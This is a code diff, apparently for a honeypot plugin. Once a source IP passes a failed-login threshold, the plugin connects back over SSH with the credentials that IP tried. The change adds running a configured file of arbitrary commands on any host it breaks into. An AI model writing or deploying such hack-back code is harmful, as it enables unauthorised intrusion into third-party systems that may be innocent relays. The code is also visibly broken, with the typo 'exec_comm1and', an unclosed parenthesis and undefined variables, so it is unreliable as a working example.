@@ -8,10 +8,10 @@
 
 # TODO:
 #   Add extra configuration options from config
-#   Add ability to load a script of commands  
 #   Add a ssh port scanner to find ssh server other ports
 #   Ability to load other attacks
 #   Save all attempted username and password
+#   Database logging on execution results
 
 import sys
 
@@ -41,12 +41,13 @@ class UserIpCombination:
 
 class Connection (Thread):
 
-    def __init__(self,combination):
+    def __init__(self,combination,cfg):
         super(Connection, self).__init__()
         self.portNumber  = 2222
         self.timeoutTime = 5
         self.target = combination.target
         self.combination = combination
+        self.cfg = cfg
 
     def run(self):
         for usernameC in self.combination.usernames:
@@ -63,13 +64,21 @@ class Connection (Thread):
                 except:      
                     pass
 
-    def commandsToExecute(sshConnection):
-        #Added your custom commands like so
-        #
-        #stdin, stdout, stderr = client.exec_command('ls')
-        #for line in stdout:
-        #print '... ' + line.strip('\n')
-        logging.info('[+] Executing commands on self.target')
+    def commandsToExecute(sshConnection):    
+        commandFile = cfg.get('database_deity', 'commandFile')
+        commandFileVerbose = cfg.get('database_deity', 'commandFileVerbose')
+        
+        if commandFile is not None:
+            logging.info('[+] Executing runscript on %s' % self.target)
+            file = open(commandFile, 'r')
+            for line in file:
+                if commandFileVerbose == True:
+                    stdin, stdout, stderr = client.exec_comm1and(line)
+                    for line in stdout:
+                        logging.info('[-] Execution %s: %s' % (self.target,line)
+                else:
+                    client.exec_command(line)
+            logging.info('[+] Completed execution on %s' % self.target)
 
 class Deity:
 
@@ -77,6 +86,7 @@ class Deity:
         self.currentCombinations = []
         self.connections = []
         self.threshholdLimit = int(cfg.get('database_deity', 'threshhold'))
+        self.cfg = cfg
 
     def __del__(self):
         for connection in self.connections:
@@ -94,7 +104,7 @@ class Deity:
                 if combination.amount >= self.threshholdLimit:
                     logging.info('[*] Attempts from %s exceeded threshhold' % ip)
                     logging.info('[*] Initiating divine intervention on: %s' % ip)
-                    connection = Connection(combination)
+                    connection = Connection(combination,self.cfg)
                     connection.start()
                     self.connections.append(connection)
                     combination.reset()
@@ -152,3 +162,4 @@ class DBLogger(dblog.DBLogger):
 
     def handleFileDownload(self, session, args):
         pass
+
